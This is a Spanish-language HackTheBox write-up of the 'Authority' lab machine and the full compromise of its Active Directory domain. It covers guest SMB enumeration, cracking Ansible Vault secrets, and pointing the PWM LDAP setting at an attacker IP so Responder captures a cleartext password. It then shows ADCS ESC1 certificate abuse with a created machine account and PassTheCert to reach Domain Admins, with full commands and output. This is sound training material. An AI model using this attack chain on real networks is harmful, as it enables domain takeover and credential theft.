---
title: "HTB: Authority"
date: 2026-04-02 12:00:00 +0000
categories: [WriteUp, HackTheBox]
tags: [Active Directory, Windows, ADCS, ESC1, Ansible, Vault, Certipy, PassTheCert]
image:
  path: /assets/img/Authority-HTB.png
  alt: HackTheBox Authority Machine
  width: 500
  height: 280
  class: sz-contain
---

## Introducción

**Authority** es una máquina de **HackTheBox** enfocada en entornos de **Active Directory**.
El acceso inicial se obtiene enumerando un recurso compartido **SMB** accesible como guest,
donde se encuentra un playbook de **Ansible** con credenciales cifradas mediante **Ansible Vault**.
Tras crackear el vault y descifrar las credenciales, se abusa del portal web **PWM** para
capturar credenciales **LDAP** en texto claro mediante **Responder**. Con acceso al sistema
como `svc_ldap`, se identifica un template de certificado vulnerable a **ESC1** a través de
**ADCS**. Dado que el template solo permite enrolamiento a `Domain Computers`, se crea una
cuenta de equipo falsa para solicitar un certificado en nombre del `Administrator`. Finalmente,
se usa **PassTheCert** para añadir `svc_ldap` al grupo **Domain Admins** y obtener control
total del dominio.

---

## Reconocimiento

### Comprobación de conectividad

```bash
ping -c 1 10.129.12.64
```

```
64 bytes from 10.129.12.64: icmp_seq=1 ttl=127 time=93.1 ms
```

### Escaneo de Puertos

```bash
rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -Pn -o nmapresult.txt
```

**Resultados relevantes:**

| Puerto | Estado | Servicio                        |
|--------|--------|---------------------------------|
| 53     | open   | Simple DNS Plus                 |
| 80     | open   | Microsoft IIS 10.0              |
| 88     | open   | Kerberos                        |
| 135    | open   | MS RPC                          |
| 139    | open   | NetBIOS                         |
| 389    | open   | LDAP (AD)                       |
| 445    | open   | SMB                             |
| 464    | open   | Kpasswd5                        |
| 593    | open   | RPC over HTTP                   |
| 636    | open   | LDAPS                           |
| 3268   | open   | LDAP Global Catalog             |
| 3269   | open   | LDAPS Global Catalog            |
| 5985   | open   | WinRM (HTTP)                    |
| 8443   | open   | HTTPS (Apache Tomcat)           |
| 9389   | open   | .NET Message Framing            |

### Análisis del escaneo

Los puertos habituales de **Active Directory** confirman que el host es un **Controlador de Dominio** del entorno `authority.htb`.

**Observaciones clave:**

- **Puerto 8443 (Apache Tomcat):** Servicio web adicional que no es estándar en un DC. Sugiere que hay una aplicación de gestión corriendo — vale la pena investigarlo en paralelo con la enumeración SMB.
- **ADCS detectado:** Los certificados SSL exponen la CA interna `htb-AUTHORITY-CA`. Señal temprana de que la escalada probablemente involucre abuso de templates ADCS.
- **Firma SMB obligatoria:** Descarta relay NTLM con ntlmrelayx, pero **no descarta captura de credenciales** mediante Responder si logramos que el servidor inicie una conexión saliente hacia nosotros.
- **Desfase horario:** Crítico para Kerberos. Sincronizar con `sudo ntpdate -u $IP` antes de cualquier ataque con tickets.

---

## Enumeración inicial

### Enumeración de usuarios via Kerberos

`kerbrute` realiza **AS-REQ** para cada nombre de usuario sin enviar contraseña. Si el KDC responde con `PRINCIPAL UNKNOWN` el usuario no existe; si responde con cualquier otro error (incluso `PREAUTH_REQUIRED`) el usuario sí existe. Esto es efectivo sin ninguna credencial previa:

```bash
kerbrute userenum --dc $IP -d authority.htb /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

```
[+] VALID USERNAME: administrator@authority.htb
[+] VALID USERNAME: guest@authority.htb
```

### Enumeración SMB como Guest

La cuenta `Guest` de Windows normalmente está deshabilitada en DCs modernos, pero en esta máquina está activa. Al autenticarse sin contraseña (`-p ''`) NXC usa la sesión nula de SMB, que en algunos entornos permite leer recursos compartidos no protegidos:

```bash
nxc smb $IP -u 'guest' -p '' --shares
```

```
SMB  10.129.12.64  445  AUTHORITY  [+] authority.htb\guest: (Guest)
SMB  10.129.12.64  445  AUTHORITY  Share           Permissions
SMB  10.129.12.64  445  AUTHORITY  Development     READ
SMB  10.129.12.64  445  AUTHORITY  IPC$            READ
```

El share **Development** con permisos de lectura es inusual en un DC. Procedemos a enumerar su contenido completo con el módulo `spider_plus`:

```bash
nxc smb $IP -u 'guest' -p '' --share Development \
  -M spider_plus -o SHARE=Development
```

Del JSON generado, encontramos el archivo de interés:

```json
"Automation/Ansible/PWM/defaults/main.yml": {
    "size": "1.55 KB"
}
```

La ruta `Automation/Ansible/` indica que este servidor usa **Ansible** para gestión de configuración automatizada. Los playbooks de Ansible frecuentemente contienen credenciales de servicios.

---

## Ansible Vault — Descifrado de credenciales

### ¿Qué es Ansible Vault?

**Ansible** es una herramienta de automatización de infraestructura que gestiona configuraciones mediante **playbooks** (archivos YAML). Los playbooks frecuentemente necesitan credenciales para conectarse a servicios (bases de datos, LDAP, APIs), y almacenarlas en texto claro en el repositorio sería un riesgo enorme.

**Ansible Vault** es el mecanismo de cifrado integrado de Ansible. Cifra valores o archivos completos usando **AES-256** con una contraseña maestra. En los playbooks, los valores cifrados se identifican con el prefijo `!vault |` seguido del blob en el formato:

```
$ANSIBLE_VAULT;1.1;AES256
<datos hexadecimales>
```

**¿Por qué es esto un riesgo de seguridad?**

Ansible Vault está diseñado para proteger credenciales en repositorios de control de versiones (Git). El modelo de seguridad asume que:
1. El repositorio es privado.
2. La contraseña del vault se distribuye de forma segura (variables de entorno, HashiCorp Vault, etc.).

Si el share SMB con los playbooks es accesible como guest **y** la contraseña del vault es débil, ambas suposiciones fallan y los secretos quedan completamente expuestos.

Descargamos el archivo:

```bash
nxc smb $IP -u 'guest' -p '' --share Development \
  --get-file 'Automation/Ansible/PWM/defaults/main.yml' './main.yml'
```

El archivo contiene tres secretos cifrados:

```yaml
pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731...

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261...

ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731...
```

### Cracking del Vault

`ansible2john` convierte cada blob al formato de hash que entiende John the Ripper:

```bash
ansible2john admin_login.hash     > admin_login_john.hash
ansible2john admin_password.hash  > admin_password_john.hash
ansible2john ldap_admin.hash      > ldap_admin_john.hash

john admin_login_john.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Contraseña del vault:** `!@#$%^&*`

Los tres vaults comparten la misma contraseña — práctica común pero insegura. Desciframos cada uno:

```bash
echo '!@#$%^&*' > vault_pass.txt
ansible-vault decrypt admin_login.hash     --vault-password-file vault_pass.txt
ansible-vault decrypt admin_password.hash  --vault-password-file vault_pass.txt
ansible-vault decrypt ldap_admin.hash      --vault-password-file vault_pass.txt
```

**Credenciales obtenidas:**

| Variable             | Valor               |
|----------------------|---------------------|
| `pwm_admin_login`    | `svc_pwm`           |
| `pwm_admin_password` | `pWm_@dm!N_!23`     |
| `ldap_admin_password`| `DevT3st@123`       |

---

## Captura de credenciales LDAP via Responder

### ¿Qué es PWM?

**PWM** es una aplicación open-source de autoservicio de contraseñas para Active Directory. Permite a los usuarios resetear sus contraseñas sin intervención del helpdesk. Para hacer esto, PWM necesita conectarse a **LDAP** con una cuenta privilegiada que pueda modificar atributos de usuario — por eso tiene credenciales LDAP almacenadas en su configuración.

Accedemos al portal en `https://$IP:8443` con `svc_pwm:pWm_@dm!N_!23`:

![PWM Login](/assets/img/Authority/web.png)

![PWM Dashboard](/assets/img/Authority/config.png)

### ¿Cómo funciona el ataque con Responder?

El portal PWM tiene una función de **"Test LDAP Connection"** o importación de configuración que permite cambiar el servidor LDAP al que se conecta. El ataque funciona así:

```
PWM configurado para conectarse a ldaps://authority.htb:636
    │
    ▼ (modificamos la configuración)
PWM configurado para conectarse a ldap://10.10.14.116:389 (nuestra IP)
    │
    ▼ (importamos la configuración)
PWM intenta conectarse a nuestro "servidor LDAP"
    │
    ▼
Responder actúa como servidor LDAP falso y captura el BIND request
    │
    ▼
El BIND request LDAP contiene las credenciales EN TEXTO CLARO
(a diferencia de NTLM/Kerberos, LDAP simple bind envía usuario:contraseña sin cifrar)
```

**¿Por qué LDAP simple bind expone credenciales en claro?**

El protocolo LDAP tiene múltiples mecanismos de autenticación (SASL, GSSAPI, etc.), pero el más simple y común es el **simple bind**: el cliente envía el DN del usuario y la contraseña directamente en el paquete LDAP, sin cifrado ni challenge-response. Si la conexión no usa TLS (`ldaps://`), las credenciales viajan en texto plano. Si logramos que el cliente se conecte a un servidor que controlamos (aunque sin TLS), capturamos todo.

Modificamos el endpoint en la configuración descargada:

```xml
<!-- Original -->
<value>ldaps://authority.authority.htb:636</value>

<!-- Modificado: nuestra IP, sin TLS -->
<value>ldap://10.10.14.116:389</value>
```

Iniciamos Responder para capturar la conexión entrante:

```bash
sudo responder -I tun0
```

Importamos la configuración modificada en el portal:

![PWM Import](/assets/img/Authority/portal.png)

Responder captura el BIND request con las credenciales en claro:

```
[*] Cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
Password: lDaP_1n_th3_cle4r!
```

---

## Acceso Inicial — Evil-WinRM como svc_ldap

```bash
nxc winrm $IP -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
```

```
WINRM  10.129.12.64  5985  AUTHORITY  [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
```

```bash
evil-winrm -i $IP -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
```

```powershell
*Evil-WinRM* PS C:\Users\svc_ldap> type Desktop\user.txt
94fc79389c0f72ee2835223c8164c207
```

---

## Escalada de Privilegios — ESC1 + PassTheCert

### Contexto previo

```powershell
*Evil-WinRM* PS C:\Users\svc_ldap> net users /domain
Administrator  Guest  krbtgt  svc_ldap
```

`svc_ldap` es el único usuario no predeterminado del dominio. No hay BloodHound paths obvios de ACL abuse. La escalada debe ser técnica — y el ADCS detectado en el reconocimiento es nuestra pista.

---

### ESC1 — ¿Qué es y por qué funciona?

**ESC1** es una de las vulnerabilidades más críticas en ADCS. Ocurre cuando un template de certificado cumple tres condiciones simultáneamente:

1. **Enrollee Supplies Subject** (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`): el solicitante puede especificar libremente el `Subject` y el `Subject Alternative Name (SAN)` del certificado, en lugar de que la CA lo derive automáticamente del objeto de AD del solicitante.
2. **Client Authentication**: el certificado emitido puede usarse para autenticarse en AD (PKINIT / Kerberos / LDAP).
3. **Permisos de enrolamiento**: alguna cuenta que controlamos (o podemos controlar) tiene derechos para solicitar este template.

**¿Por qué el SAN es tan crítico?**

Cuando se usa un certificado para autenticación Kerberos (PKINIT), el KDC busca a qué usuario de AD corresponde el certificado usando el **User Principal Name (UPN)** del campo SAN. Si el solicitante puede especificar cualquier UPN en el SAN, puede obtener un certificado que el KDC interpretará como perteneciente a cualquier usuario del dominio, **incluyendo el Administrator**.

```
Atacante solicita certificado con SAN: administrator@authority.htb
    │
    ▼
CA verifica: ¿tiene el solicitante derechos en el template? → Sí
CA no verifica: ¿el UPN en el SAN corresponde al solicitante real? → No lo verifica (ESC1)
    │
    ▼
CA emite certificado con UPN = administrator@authority.htb
    │
    ▼
KDC recibe el certificado → busca usuario con UPN administrator@authority.htb → Administrator
    │
    ▼
KDC emite TGT para Administrator
```

### Enumeración de templates vulnerables

```bash
certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip $IP -vulnerable
```

```
Template Name          : CorpVPN
Enrollee Supplies Subject : True
Client Authentication  : True
Enrollment Rights      : AUTHORITY.HTB\Domain Computers
[!] Vulnerabilities
  ESC1: Enrollee supplies subject and template allows client authentication.
```

El template **CorpVPN** es vulnerable a ESC1, **pero** los derechos de enrolamiento están restringidos a `Domain Computers`. `svc_ldap` es una cuenta de usuario, no de equipo — no puede enrolarse directamente.

---

### MachineAccountQuota — Crear una cuenta de equipo

**MachineAccountQuota** es un atributo del objeto de dominio (`ms-DS-MachineAccountQuota`) que controla **cuántas cuentas de equipo puede crear un usuario normal sin ser administrador**. El valor por defecto en AD es **10**.

Esto existe por razones históricas de conveniencia: permite que los usuarios unan sus propias máquinas al dominio sin intervención de IT. Desde una perspectiva ofensiva, significa que cualquier usuario autenticado puede crear hasta 10 machine accounts legítimas en el dominio.

**¿Por qué las machine accounts importan aquí?**

Porque el template **CorpVPN** permite enrolamiento a `Domain Computers` — y una machine account creada por nosotros es un miembro válido de `Domain Computers`. Al crear `LEXO$`, automáticamente tenemos una cuenta que puede enrolarse en **CorpVPN** y por lo tanto explotar ESC1.

```bash
nxc ldap $IP -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq
```

```
MachineAccountQuota: 10
```

```bash
addcomputer.py -computer-name 'LEXO$' -computer-pass 'Password123!' -dc-ip $IP authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'
```

```
[*] Successfully added machine account LEXO$ with password Password123!.
```

### Solicitar certificado con UPN del Administrator

Con `LEXO$` (que pertenece a `Domain Computers`), solicitamos el template **CorpVPN** especificando `-upn administrator@authority.htb` en el SAN:

```bash
certipy req -u 'LEXO$@authority.htb' -p 'Password123!' -dc-ip $IP -target authority.htb -template 'CorpVPN' -upn administrator@authority.htb -ca 'AUTHORITY-CA'
```

```
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Saving certificate and private key to 'administrator.pfx'
```

La CA emitió un certificado con el UPN del Administrator sin verificar que `LEXO$` es realmente el Administrator. ESC1 explotado con éxito.

---

### PassTheCert — Fallback cuando PKINIT no funciona

**¿Qué es PKINIT?**

PKINIT es la extensión de Kerberos que permite usar certificados X.509 para obtener TGTs en lugar de contraseñas. El flujo normal sería:

```bash
certipy auth -pfx administrator.pfx -dc-ip $IP
# → TGT + hash NT del Administrator (UnPAC-the-Hash)
```

**¿Por qué falla aquí?**

En esta máquina, el DC rechaza la autenticación PKINIT con `KRB_AP_ERR_SKEW` a pesar de haber sincronizado el reloj. Esto puede ocurrir cuando el DC tiene PKINIT parcialmente desconfigurado, o cuando hay restricciones adicionales en el template que impiden el uso del certificado para Kerberos directamente.

**¿Qué es PassTheCert?**

**PassTheCert** es una técnica alternativa que usa el certificado directamente sobre **LDAP con autenticación basada en certificados (LDAPS/StartTLS)**. En lugar de obtener un TGT Kerberos, se establece una sesión LDAP autenticada como el titular del certificado.

**¿Cómo funciona técnicamente?**

El protocolo LDAP soporta autenticación mediante certificados TLS mutuos (mTLS): el cliente presenta su certificado durante el handshake TLS, y el servidor verifica que corresponde a un usuario de AD. Si el DC tiene LDAPS habilitado (puerto 636), podemos establecer una sesión LDAP **como Administrator** usando únicamente el certificado, sin contraseña ni TGT.

Con esa sesión LDAP autenticada como Administrator, podemos hacer cualquier operación LDAP con sus privilegios — incluyendo modificar membresías de grupos:

```bash
# Extraemos el certificado y la clave privada del PFX
certipy cert -pfx administrator.pfx -nokey -out admin.crt
certipy cert -pfx administrator.pfx -nocert -out admin.key
```

```bash
python3 passthecert.py -action ldap-shell \
  -crt admin.crt -key admin.key \
  -domain authority.htb -dc-ip $IP
```

Dentro de la shell LDAP (ejecutando como Administrator vía certificado):

```
# add_user_to_group svc_ldap "Domain Admins"
Adding user: svc_ldap to group Domain Admins result: OK
```

> **¿Por qué añadimos `svc_ldap` en lugar de usar directamente el certificado?**
> Porque `svc_ldap` es la cuenta con la que tenemos sesión WinRM activa. Al añadirla a Domain Admins, podemos usar esa shell existente con privilegios elevados sin necesidad de obtener una nueva shell como Administrator.

---

## Acceso Final como Administrador

```bash
evil-winrm -i $IP -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
```

```powershell
*Evil-WinRM* PS C:\users\administrator\desktop> type root.txt
f9b469883549a332819a92714e117772
```

**¡Máquina comprometida con éxito!**
